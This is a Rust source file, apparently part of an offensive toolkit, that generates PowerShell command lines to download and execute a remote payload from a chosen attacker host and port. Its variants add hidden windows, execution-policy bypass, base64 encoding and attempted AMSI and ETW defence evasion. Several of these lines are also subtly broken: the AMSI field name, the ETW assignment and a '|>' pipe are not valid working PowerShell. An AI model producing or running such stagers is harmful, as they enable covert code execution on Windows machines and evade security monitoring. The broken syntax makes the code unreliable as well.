// Windows PowerShell payload generator
use crate::cli::banner;
use base64::{engine::general_purpose::STANDARD, Engine as _};

pub struct PowerShellGenerator;

impl PowerShellGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str, variant: &str) -> String {
        banner::print_exploiting("PS-PAYLOAD", &format!("{}:{}", lhost, lport));
        
        match variant {
            "amsi_bypass" => format!(
                "powershell -nop -w hidden -exec bypass -c \"[Ref].Assembly.GetType('System.Management.Automation.'+'AMSI'+'Context').GetField('m_amp','NonPublic,Static').SetValue($null,$null);IEX (New-Object Net.WebClient).DownloadString('http://{}:{}/payload.ps1')\"",
                lhost, lport
            ),
            "etw_bypass" => format!(
                "powershell -nop -w hidden -exec bypass -c \"[System.Diagnostics.Eventing.EventLog]+'::WriteEvent' = $null;IEX (New-Object Net.WebClient).DownloadString('http://{}:{}/payload.ps1')\"",
                lhost, lport
            ),
            "encoded" => {
                let encoded = STANDARD.encode(format!(
                    "IEX (New-Object Net.WebClient).DownloadString('http://{}:{}/payload.ps1')",
                    lhost, lport
                ));
                format!("powershell -nop -w hidden -exec bypass -EncodedCommand {}", encoded)
            }
            "reflected" => format!(
                "powershell -nop -w hidden -exec bypass -c \"(New-Object Net.WebClient).DownloadData('http://{}:{}/payload.b64') |> {{[Convert]::FromBase64String($input)}} | IEX\"",
                lhost, lport
            ),
            _ => format!(
                "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://{}:{}/payload.ps1')\"",
                lhost, lport
            )
        }
    }
}
